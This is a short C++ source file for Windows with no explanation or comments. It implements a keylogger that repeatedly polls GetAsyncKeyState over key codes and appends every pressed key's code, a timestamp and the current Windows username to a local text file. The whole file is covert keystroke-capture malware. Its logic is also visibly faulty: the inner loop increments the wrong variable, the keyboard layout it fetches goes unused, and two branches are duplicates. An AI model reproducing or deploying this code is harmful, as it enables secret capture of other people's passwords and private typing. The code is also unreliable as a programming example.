
#include <iostream>
#include <ctime>
#include <stdio.h>
#include <windows.h>
#include <Lmcons.h>

#define FILE_NAME "Record2.txt"

using namespace std;

int main() {
   

    FILE *file = fopen(FILE_NAME, "w");

      
    unsigned short ch,i;
    Sleep(10);
    while (1)
    {
                    
        
        ch=1;
        Sleep(10);
        for (ch=0;ch<=250;ch++)
        {
            Sleep(10);
            int i=0;
            for(i=0; i<=100;ch++)
            {
                
                if(i==100)
                {
                    if(GetAsyncKeyState(ch) == -32767)
                    {
                        file=fopen(FILE_NAME,"a");
                        time_t now = time(nullptr);
                        char username[UNLEN+1];
                        DWORD username_len = UNLEN+1;
                        GetUserNameA(username, &username_len);
                        HKL KeyboardLayout = GetKeyboardLayout(0);
                        fprintf(file,"%d %d %s uuid\n",ch,now,username);
                        fclose(file);
                        i++;   
                        
                    } 
                }
                else
                { 
                    if(GetAsyncKeyState(ch) == -32767)
                    {
                        file=fopen(FILE_NAME,"a");
                        time_t now = time(nullptr);
                        char username[UNLEN+1];
                        DWORD username_len = UNLEN+1;
                        GetUserNameA(username, &username_len);
                        HKL KeyboardLayout=0;
                        KeyboardLayout = GetKeyboardLayout(0);
                        fprintf(file,"%d %d %s uuid\n",ch,now,username);
                        fclose(file);
                        i++;
                    }
                }
            }        
        }   
    }
}